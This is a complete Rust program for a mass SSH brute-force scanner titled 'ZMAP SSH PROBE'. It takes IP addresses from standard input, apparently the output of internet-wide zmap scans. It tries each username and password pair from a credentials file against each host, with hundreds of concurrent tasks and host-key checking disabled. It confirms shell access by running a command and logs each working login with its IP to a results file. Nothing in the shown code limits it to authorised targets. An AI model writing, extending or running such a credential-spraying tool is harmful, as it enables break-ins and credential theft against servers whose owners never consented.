use async_ssh2_tokio::client::{Client, AuthMethod, ServerCheckMethod};
use std::io::{self, BufRead, Write, BufWriter};
use std::fs::OpenOptions;
use tokio::sync::mpsc;
use std::sync::atomic::{AtomicUsize, Ordering};
use colored::*; 
use clap::Parser;
use tokio::io::{AsyncBufReadExt, BufReader};
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::time::{timeout, Duration};


static IMPORTED: AtomicUsize = AtomicUsize::new(0);
static CHECKED: AtomicUsize = AtomicUsize::new(0);
static COMBOS_CHECKED: AtomicUsize = AtomicUsize::new(0);
static SUCCESS: AtomicUsize = AtomicUsize::new(0);
static FAILED: AtomicUsize = AtomicUsize::new(0);
static TIMEOUTS: AtomicUsize = AtomicUsize::new(0);

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Specifies the SSH port
    #[arg(short = 'p', long, default_value = "22")]
    port: u16,

    /// Specifies the name of the output file
    #[arg(short = 'o', long, default_value = "results.txt")]
    output_file: String,

    /// Specifies the number of threads to use
    #[arg(short = 't', long, default_value = "500")]
    threads: usize,

    /// Specifies the timeout in seconds for each SSH check
    #[arg(short = 's', long, default_value = "5")]
    timeout: u64,
}


#[tokio::main]
async fn main() {
    let args = Args::parse();

    // Create mpsc channel
    let (ip_tx, ip_rx) = mpsc::channel(args.threads);
    let shared_rx = Arc::new(Mutex::new(ip_rx));

    tokio::task::spawn(async {
        println!("+-------------------------------------------+");
        println!("|             ZMAP SSH PROBE                |");
        println!("+-------------------------------------------+");

        loop {
            tokio::time::sleep(Duration::from_secs(1)).await;

            // Read the atomic values
            let imported_count = IMPORTED.load(Ordering::Relaxed);
            let checked_count = CHECKED.load(Ordering::Relaxed);
            let combos_checked_count = COMBOS_CHECKED.load(Ordering::Relaxed);
            let success_count = SUCCESS.load(Ordering::Relaxed);
            let failed_count = FAILED.load(Ordering::Relaxed);
            let timeouts_count = TIMEOUTS.load(Ordering::Relaxed);

            print!("IPs Imported: {} | IPs Checked: {} | Combos Checked: {} | Successful: {} | Failed: {} | Timeouts: {} \n", 
                imported_count.to_string().blue(),
                checked_count.to_string().blue(),
                combos_checked_count.to_string().yellow(), 
                success_count.to_string().green(),
                failed_count.to_string().red(),
                timeouts_count.to_string().magenta()
            );

            io::stdout().flush().unwrap();
        }
    });

    tokio::task::spawn(async move {
        let stdin = tokio::io::stdin();
        let mut reader = BufReader::new(stdin).lines();

        while let Ok(Some(line)) = reader.next_line().await {
            ip_tx.send(line).await.expect("Failed to send IP");
            IMPORTED.fetch_add(1, Ordering::Relaxed);
        }

        if let Err(e) = reader.next_line().await {
            eprintln!("Failed to read line: {}", e);
        }
    });

    let credentials = load_credentials_file("credentials.txt");

    let handles: Vec<_> = (0..args.threads).map(|_| {
        let shared_rx = shared_rx.clone();
        let creds = credentials.clone();
        let output_file = args.output_file.clone();
        let ssh_check_timeout = Duration::from_secs(args.timeout);

        tokio::task::spawn(async move {
            loop {
                let ip_option = {
                    let mut locked_rx = shared_rx.lock().await;
                    locked_rx.recv().await
                };

                if let Some(ip) = ip_option {
                    check_ssh_login(ip, args.port, creds.clone(), &output_file, ssh_check_timeout).await;
                } else {
                    break; // Exit loop if the channel is closed and all messages are received
                }
            }
        })
    }).collect();

    // Wait for all tasks to finish
    for handle in handles {
        handle.await.unwrap();
    }
}

async fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, output_file: &str, timeout_duration: Duration) {
    CHECKED.fetch_add(1, Ordering::Relaxed);

    for (username, password) in &credentials {
        let auth_method = AuthMethod::with_password(password);
        
        let timed_result = timeout(timeout_duration, Client::connect(
            (ip.as_str(), port),
            username,
            auth_method.clone(),
            ServerCheckMethod::NoCheck,
        )).await;

        match timed_result {
            Ok(result) => match result {
                Ok(client) => {
                    COMBOS_CHECKED.fetch_add(1, Ordering::Relaxed);
                    let exec_result = client.execute("echo .").await;
                    
                    if let Ok(res) = exec_result {
                        if res.exit_status == 0 {
                            write_successful_login_to_file(output_file, &ip, username, password);
                            SUCCESS.fetch_add(1, Ordering::Relaxed);
                            break;  // Exit if a successful login is found.
                        } else {
                            FAILED.fetch_add(1, Ordering::Relaxed);
                        }
                    } else {
                        FAILED.fetch_add(1, Ordering::Relaxed);
                    }
                },
                Err(e) => {
                    if e.to_string().contains("timeout") {
                        TIMEOUTS.fetch_add(1, Ordering::Relaxed);
                    } else {
                        FAILED.fetch_add(1, Ordering::Relaxed);
                    }
                }
            },
            Err(_) => {
                // This block handles the case where our manual timeout has been reached
                TIMEOUTS.fetch_add(1, Ordering::Relaxed);
            }
        }
    }
}

fn load_credentials_file(file_path: &str) -> Vec<(String, String)> {
    let file = std::fs::File::open(file_path).expect("Unable to open credentials file");
    let reader = std::io::BufReader::new(file);

    reader.lines().filter_map(|line| {
        let line = line.expect("Failed to read line from credentials file");
        let parts: Vec<&str> = line.split(':').collect();
        if parts.len() == 2 {
            Some((parts[0].to_string(), parts[1].to_string()))
        } else {
            None
        }
    }).collect()
}

fn write_successful_login_to_file(output_file: &str, ip: &str, username: &str, password: &str) {
    let file = OpenOptions::new()
        .write(true)
        .append(true)
        .create(true)
        .open(output_file)
        .unwrap();
    let mut file = BufWriter::new(file);
    
    writeln!(file, "{}:{}@{}", username, password, ip).unwrap();
    file.flush().unwrap();
}
